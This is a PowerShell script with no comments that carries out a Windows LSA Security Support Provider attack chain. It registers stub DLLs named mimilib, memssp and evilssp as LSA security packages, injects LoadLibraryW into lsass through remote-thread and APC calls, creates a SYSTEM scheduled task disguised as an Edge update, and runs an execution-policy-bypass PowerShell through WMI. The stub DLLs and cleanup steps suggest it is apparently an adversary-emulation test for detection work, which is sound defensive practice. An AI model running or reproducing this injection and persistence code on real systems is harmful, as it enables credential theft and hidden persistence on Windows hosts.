$lsaKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"

$secPkgs = @("")
try { $secPkgs = (Get-ItemProperty -Path $lsaKey -Name "Security Packages" -ErrorAction Stop)."Security Packages" } catch {}

foreach ($ssp in @("mimilib", "memssp", "evilssp")) {
    $sspDll = "$env:SYSTEMROOT\System32\${ssp}.dll"
    $dllStub = [byte[]]@(0x4D, 0x5A, 0x90, 0x00) + (New-Object byte[] 4092)
    $export = [System.Text.Encoding]::ASCII.GetBytes("SpLsaModeInitialize")
    [Array]::Copy($export, 0, $dllStub, 512, $export.Length)
    try { [System.IO.File]::WriteAllBytes($sspDll, $dllStub) } catch {}
    try {
        $pkgs = (Get-ItemProperty -Path $lsaKey -Name "Security Packages" -ErrorAction Stop)."Security Packages"
        Set-ItemProperty -Path $lsaKey -Name "Security Packages" -Value (@($pkgs) + @($ssp)) -ErrorAction Stop
    } catch {}
    Remove-Item $sspDll -Force -ErrorAction SilentlyContinue
}

if (-not ('SSPLoad' -as [type])) {
    Add-Type -TypeDefinition @'
    using System;
    using System.Runtime.InteropServices;
    public class SSPLoad {
        [StructLayout(LayoutKind.Sequential)]
        public struct SEC_PKG_OPTIONS { public int Size; public int Type; public int Flags; public int SigSize; public IntPtr Sig; }
        [DllImport("secur32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
        public static extern int AddSecurityPackage(string name, ref SEC_PKG_OPTIONS opts);
    }
'@
}

$opts = New-Object SSPLoad+SEC_PKG_OPTIONS
$opts.Size = [System.Runtime.InteropServices.Marshal]::SizeOf($opts)
foreach ($ssp in @("mimilib", "memssp", "evilssp")) {
    [SSPLoad]::AddSecurityPackage($ssp, [ref]$opts) | Out-Null
}

if (-not ('LsassInject' -as [type])) {
    Add-Type -TypeDefinition @'
    using System;
    using System.Runtime.InteropServices;
    public class LsassInject {
        [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int a, bool b, int p);
        [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, int s, int t, int pr);
        [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr b, byte[] buf, int s, ref int w);
        [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, int s, IntPtr fn, IntPtr p, int f, ref int tid);
        [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string m);
        [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
        [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
        [DllImport("kernel32.dll")] public static extern IntPtr OpenThread(int a, bool b, int tid);
        [DllImport("kernel32.dll")] public static extern int QueueUserAPC(IntPtr fn, IntPtr th, IntPtr data);
    }
'@
}

$lsass = Get-Process lsass -ErrorAction SilentlyContinue
if ($lsass) {
    $h = [LsassInject]::OpenProcess(0x1F0FFF, $false, $lsass.Id)
    if ($h -ne [IntPtr]::Zero) {
        foreach ($dll in @("mimilib.dll", "memssp.dll")) {
            $dllBytes = [System.Text.Encoding]::Unicode.GetBytes("$env:SYSTEMROOT\System32\$dll" + [char]0)
            $alloc = [LsassInject]::VirtualAllocEx($h, [IntPtr]::Zero, $dllBytes.Length, 0x3000, 0x40)
            if ($alloc -ne [IntPtr]::Zero) {
                $w = 0
                [LsassInject]::WriteProcessMemory($h, $alloc, $dllBytes, $dllBytes.Length, [ref]$w) | Out-Null
                $loadLib = [LsassInject]::GetProcAddress([LsassInject]::GetModuleHandle("kernel32.dll"), "LoadLibraryW")
                $tid = 0
                [LsassInject]::CreateRemoteThread($h, [IntPtr]::Zero, 0, $loadLib, $alloc, 0, [ref]$tid) | Out-Null
            }
        }
        [LsassInject]::CloseHandle($h) | Out-Null
    }

    foreach ($t in $lsass.Threads) {
        $th = [LsassInject]::OpenThread(0x0010, $false, $t.Id)
        if ($th -ne [IntPtr]::Zero) {
            $loadLib = [LsassInject]::GetProcAddress([LsassInject]::GetModuleHandle("kernel32.dll"), "LoadLibraryW")
            [LsassInject]::QueueUserAPC($loadLib, $th, [IntPtr]::Zero) | Out-Null
            [LsassInject]::CloseHandle($th) | Out-Null
            break
        }
    }
}

& schtasks.exe /create /tn "MicrosoftEdgeUpdateSSP" /tr "rundll32.exe $env:SYSTEMROOT\System32\mimilib.dll,SpLsaModeInitialize" /sc onlogon /ru SYSTEM /f 2>&1 | Out-Null
& schtasks.exe /delete /tn "MicrosoftEdgeUpdateSSP" /f 2>&1 | Out-Null

$wmiCmd = "powershell.exe -ep bypass -c `"Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class X{[DllImport(\`"secur32.dll\`",CharSet=CharSet.Unicode)]public static extern int AddSecurityPackage(string n,IntPtr o);}';[X]::AddSecurityPackage('mimilib',[IntPtr]::Zero)`""
try { Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $wmiCmd -ErrorAction Stop | Out-Null } catch {}

try { Set-ItemProperty -Path $lsaKey -Name "Security Packages" -Value $secPkgs -ErrorAction Stop } catch {}
